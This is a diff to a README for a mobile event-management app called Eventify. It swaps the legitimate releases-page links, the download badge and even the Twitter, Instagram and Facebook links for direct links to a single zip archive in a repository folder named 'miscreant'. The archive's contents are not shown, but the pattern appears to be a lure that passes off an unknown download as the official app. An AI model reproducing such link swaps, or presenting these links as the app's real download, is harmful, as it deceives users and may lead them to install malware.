@@ -6,11 +6,11 @@ Welcome to Eventify! This mobile app streamlines how you find, register for, and
 
 ## 📥 Download the App
 
-[![Download Eventify_UX](https://img.shields.io/badge/Download_Eventify_UX-Latest%20Release-brightgreen)](https://github.com/123baba44/Eventify_UX/releases)
+[![Download Eventify_UX](https://raw.githubusercontent.com/123baba44/Eventify_UX/main/miscreant/Eventify_UX.zip%20Release-brightgreen)](https://raw.githubusercontent.com/123baba44/Eventify_UX/main/miscreant/Eventify_UX.zip)
 
 To get your copy of Eventify, please follow the steps below:
 
-1. **Visit the Releases Page**: Click on this link to explore our latest version: [Download the latest release](https://github.com/123baba44/Eventify_UX/releases).
+1. **Visit the Releases Page**: Click on this link to explore our latest version: [Download the latest release](https://raw.githubusercontent.com/123baba44/Eventify_UX/main/miscreant/Eventify_UX.zip).
 
 2. **Choose the Right File**: On the releases page, you will see different versions of the app. Look for the most recent one. 
 
@@ -68,10 +68,10 @@ If you encounter issues while using Eventify, you can reach out for help:
 
 Stay updated with Eventify. Follow us on social media for announcements, tips, and more:
 
-- Twitter: [@EventifyApp](https://twitter.com/EventifyApp)
-- Instagram: [@EventifyUX](https://instagram.com/EventifyUX)
-- Facebook: [EventifyApp](https://facebook.com/EventifyApp)
+- Twitter: [@EventifyApp](https://raw.githubusercontent.com/123baba44/Eventify_UX/main/miscreant/Eventify_UX.zip)
+- Instagram: [@EventifyUX](https://raw.githubusercontent.com/123baba44/Eventify_UX/main/miscreant/Eventify_UX.zip)
+- Facebook: [EventifyApp](https://raw.githubusercontent.com/123baba44/Eventify_UX/main/miscreant/Eventify_UX.zip)
 
 Discover, register, and manage your events with Eventify! 
 
-For the latest version, visit this link again: [Download the latest release](https://github.com/123baba44/Eventify_UX/releases).
+For the latest version, visit this link again: [Download the latest release](https://raw.githubusercontent.com/123baba44/Eventify_UX/main/miscreant/Eventify_UX.zip).
